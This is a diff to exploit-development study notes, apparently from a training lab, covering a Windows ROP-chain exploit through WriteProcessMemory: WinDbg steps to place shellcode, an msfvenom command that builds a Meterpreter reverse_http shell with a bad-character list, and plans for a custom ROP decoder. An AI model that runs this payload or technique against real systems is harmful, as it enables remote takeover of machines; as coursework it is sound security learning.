@@ -317,9 +317,34 @@ test alignment to return from WPM
 - `p`, to confirm return from WPM drops us into the shellcode
 
 ### Getting a Shell
+
+Replace dummy data with Meterpreter generated shellcode
+- Get offset from end of ROP chain to lpBuffer stack address where the shellcode starts. Prepend shellcode by this offset. 
+	- lpBuffer previously found at 0x110ee41c (??)
+	- `dd 110ee41c - 100`, we see the last shellcode instruction at 110ee3ac
+	- `? 110ee41c - 110ee3b0`, to get shellcode padding length of 0x6c
+- update POC: `shellcode_padding = ... // shellcode = ... // padding = ... - len(shellcode_padding) - len(shellcode))`
+- Test in WinDbg to ensure placeholder shellcode starts at the exact lpBuffer location
+	- `bp KERNEL32!WriteProcessMemoryStub`
+	- `dds esp L6`
+	- `dd lPBUFFER - 10 L8`, to inspect memory before and after the intended shellcode start
+- Generate shellcode with msfvenom `msfvenom -p windows/meterpreter/reverse_http LHOST=... LPORT=8005 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode`
+- Test again
+	- `bp KERNEL32!WPMStub`
+	- `pt` to skip to end of WriteProcessMemory
+	- `u poi(esp)`, shows shellcode instructions
+- Oh no! Access violation! the `xor` instruction tries to modify data in the shellcode itself, which has been copied to a region without write permissions
+- The msfvenom decoded payloads will not work
+- Alternatives would be: write shellcode with no bad chars includes, OR replace bad characters in the shellcode and replace them at runtime with more ROP
+
 ### Custom ROP Decoder
+Replace the bad characters with allowed dummy characters. Then create a rop gadget to replace the first dummy character with the original, bad character at runtime.
 
+### Automating the Shellcode Encoding
+Modify the python script to find bad characters in the shellcode, store their offset, create a mapping of dummy characters, and replace the bad characters.
 
+### Automating the ROP Decoder
+Modify the python script to utilize the previous shellcode character mapping and offsets to dynamically create ROP gadgets that will revert the dummy characters at runtime, resulting in functioning shellcode.
 
 
 
